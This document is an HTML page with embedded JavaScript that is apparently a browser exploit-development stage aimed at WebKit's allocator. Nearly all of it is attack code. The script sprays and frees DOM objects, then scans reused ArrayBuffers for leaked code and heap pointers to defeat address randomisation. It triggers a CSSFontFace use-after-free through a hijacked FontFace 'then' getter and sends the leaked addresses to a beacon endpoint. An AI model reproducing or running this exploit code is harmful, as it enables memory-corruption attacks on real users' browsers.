<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1136</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1136: VTABLE RESIDUE HARVEST ===');
log('info','Free DOM objects with vtables -> spray ArrayBuffers -> scan for code ptrs');
B('P1136-START','t='+Date.now());

// SIZES to test: bmalloc size classes around common DOM object sizes
var SIZES=[64,80,96,112,128,160,192,224,256,288,320];
var SPRAY_PER_SIZE=200;

// ===== PHASE 1: Create many DOM objects with vtables =====
log('info','Phase 1: Creating DOM objects...');

var domObjs=[];

// Events (CustomEvent, MouseEvent, KeyboardEvent - all have vtables)
for(var i=0;i<300;i++){
  domObjs.push(new CustomEvent('e'+i,{detail:{x:i,y:i*2,z:'pad'+i}}));
}
for(var i=0;i<200;i++){
  try{domObjs.push(new MouseEvent('click',{clientX:i,clientY:i*2,bubbles:true}));}catch(e){}
}
for(var i=0;i<200;i++){
  try{domObjs.push(new KeyboardEvent('keydown',{key:'a',code:'KeyA',keyCode:65}));}catch(e){}
}

// Range objects (have vtable)
for(var i=0;i<200;i++){
  try{domObjs.push(document.createRange());}catch(e){}
}

// TreeWalker
var tw=[];
for(var i=0;i<100;i++){
  try{tw.push(document.createTreeWalker(document.body,0xFFFFFFFF));}catch(e){}
}
domObjs=domObjs.concat(tw);

// DOMRect (lightweight, maybe not virtual - include anyway)
var tmpDiv=document.createElement('div');
tmpDiv.style.cssText='width:50px;height:50px;position:absolute;left:-9999px';
document.body.appendChild(tmpDiv);
for(var i=0;i<200;i++){
  domObjs.push(new DOMRect(i,i,100,100));
}
document.body.removeChild(tmpDiv);

// AbortController/Signal pairs
for(var i=0;i<200;i++){
  try{domObjs.push(new AbortController());}catch(e){}
}

// CSSStyleRule via stylesheet (have vtable)
var ruleSheet=document.createElement('style');
document.head.appendChild(ruleSheet);
var ruleRefs=[];
for(var i=0;i<200;i++){
  try{
    ruleSheet.sheet.insertRule('.r'+i+'{color:red;margin:1px;padding:2px}',i);
    ruleRefs.push(ruleSheet.sheet.cssRules[i]);
  }catch(e){}
}
domObjs=domObjs.concat(ruleRefs);

// Headers (Fetch API)
for(var i=0;i<200;i++){
  try{domObjs.push(new Headers({'X-A':'v'+i}));}catch(e){}
}

// URLSearchParams
for(var i=0;i<200;i++){
  try{domObjs.push(new URLSearchParams('a='+i));}catch(e){}
}

// MutationObserver
for(var i=0;i<50;i++){
  try{domObjs.push(new MutationObserver(function(){}));}catch(e){}
}

var totalCreated=domObjs.length;
B('P1136-CREATED','total='+totalCreated);
log('ok','Created '+totalCreated+' DOM objects');

// ===== PHASE 2: Free them all =====
log('info','Phase 2: Releasing all DOM object references...');

// Remove stylesheet (frees CSSStyleRules)
if(ruleSheet.parentNode)ruleSheet.remove();
ruleRefs=null;
tw=null;

// Null all references
var objCount=domObjs.length;
for(var i=0;i<objCount;i++){
  domObjs[i]=null;
}
domObjs=null;

// Force GC pressure - allocate and free repeatedly
log('info','Forcing GC pressure...');
for(var gc=0;gc<5;gc++){
  var trash=[];
  for(var i=0;i<10000;i++){
    trash.push({a:i,b:'x'.repeat(32)});
  }
  trash=null;
}

// ===== PHASE 3: Spray ArrayBuffers across multiple size classes =====
log('info','Phase 3: Spraying '+SIZES.length+' size classes x '+SPRAY_PER_SIZE+'...');

var allBufs=[];
for(var si=0;si<SIZES.length;si++){
  var sz=SIZES[si];
  for(var k=0;k<SPRAY_PER_SIZE;k++){
    var ab=new ArrayBuffer(sz);
    allBufs.push({ab:ab,sz:sz,si:si,k:k});
  }
}

B('P1136-SPRAY','total='+allBufs.length);

// ===== PHASE 4: Scan ALL buffers for non-zero data =====
log('info','Phase 4: Scanning '+allBufs.length+' buffers for vtable residue...');

var hits=[];
var codeHits=[];
var heapHits=[];

for(var i=0;i<allBufs.length;i++){
  var v=new BigUint64Array(allBufs[i].ab);
  var hasNonZero=false;

  for(var q=0;q<v.length;q++){
    if(v[q]!==0n){
      hasNonZero=true;
      var val=v[q];
      var hi=Number(val>>32n);
      var lo=Number(val&0xFFFFFFFFn);

      // Classify this value
      var tag='UNK';
      if(hi>=0x10&&hi<=0xFF&&lo>0) tag='HEAP'; // heap pointer
      else if(hi===0&&lo<0x10000) tag='SMALL'; // small integer
      else if(hi===0xFFFFFFFF) tag='SENT'; // sentinel
      else if(hi>=0x1&&hi<=0xF&&lo>0) tag='LOW'; // low address
      else if(hi>=0x100&&hi<=0xFFFF&&(val&7n)===0n) tag='CODE?'; // possible code ptr, aligned
      else if(hi>=0x200&&hi<=0x7FFF) tag='CODE'; // very likely code ptr
      else tag='OTHER';

      var entry={i:i,sz:allBufs[i].sz,q:q,val:hex64(val),hi:'0x'+hi.toString(16),tag:tag};
      hits.push(entry);

      if(tag==='CODE'||tag==='CODE?'){
        codeHits.push(entry);
        log('win','CODE PTR! buf['+i+'] sz='+allBufs[i].sz+' q'+q+'='+hex64(val)+' ('+tag+')');
      }else if(tag==='HEAP'){
        heapHits.push(entry);
      }
    }
  }

  if(hasNonZero&&hits.length<=3){
    // Dump first few non-zero buffers completely
    var dump=[];
    for(var q=0;q<v.length;q++){
      if(v[q]!==0n)dump.push('q'+q+'='+hex64(v[q]));
    }
    B('P1136-DUMP-'+i,'sz='+allBufs[i].sz+'|'+dump.join(','));
    log('ptr','buf['+i+'] sz='+allBufs[i].sz+': '+dump.slice(0,8).join(' '));
  }
}

B('P1136-SCAN','total='+hits.length+'|code='+codeHits.length+'|heap='+heapHits.length);
log('info','Scan: '+hits.length+' non-zero values, '+codeHits.length+' code ptrs, '+heapHits.length+' heap ptrs');

// Report all code hits
for(var c=0;c<Math.min(codeHits.length,10);c++){
  B('P1136-CODE-'+c,JSON.stringify(codeHits[c]));
}

// Report first few heap hits
for(var c=0;c<Math.min(heapHits.length,5);c++){
  B('P1136-HEAP-'+c,JSON.stringify(heapHits[c]));
}

// ===== PHASE 5: CSSFontFace UAF for comparison =====
// Also trigger one UAF to get q11, and check if q11's page contains vtable data
log('info','Phase 5: CSSFontFace UAF for heap position reference...');

var r=Date.now()%100000;
var uafHit=false,uafBuf=null;

var st=document.createElement('style');
st.textContent="@font-face{font-family:t"+r+";src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);
var ff=new FontFace('u'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;
  uafBuf=[];
  for(var i=0;i<100;i++)uafBuf.push(new ArrayBuffer(192));
  try{document.fonts.check('1em t'+r);}catch(e){}
  return undefined;
},set:function(){}});

document.fonts.load('1em u'+r+', t'+r,'AB').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  var uafQ11=null,uafQ13=null;
  if(uafBuf){
    for(var bi=0;bi<uafBuf.length;bi++){
      var b=new BigUint64Array(uafBuf[bi]);
      if(b[0]===1n&&b[11]!==0n&&b[13]!==0n){
        var h11=Number(b[11]>>32n),h13=Number(b[13]>>32n);
        if(h11>=0x10&&h11<=0xFF&&h13>=0x10&&h13<=0xFF){
          var allZ=true;
          for(var z=1;z<=10;z++)if(b[z]!==0n){allZ=false;break;}
          if(allZ&&b[12]===0n){
            uafQ11=b[11];uafQ13=b[13];
            log('ok','UAF ref: q11='+hex64(uafQ11)+' q13='+hex64(uafQ13));
            B('P1136-UAF','q11='+hex64(uafQ11)+'|q13='+hex64(uafQ13));
            break;
          }
        }
      }
    }
  }

  // FINAL SUMMARY
  var summary={
    created:totalCreated,
    sprayed:allBufs.length,
    nonzero:hits.length,
    code:codeHits.length,
    heap:heapHits.length,
    uafQ11:uafQ11?hex64(uafQ11):'none'
  };

  B('P1136-DONE',JSON.stringify(summary));
  log('phase','=== DONE: '+JSON.stringify(summary)+' ===');
},15);
</script></body></html>
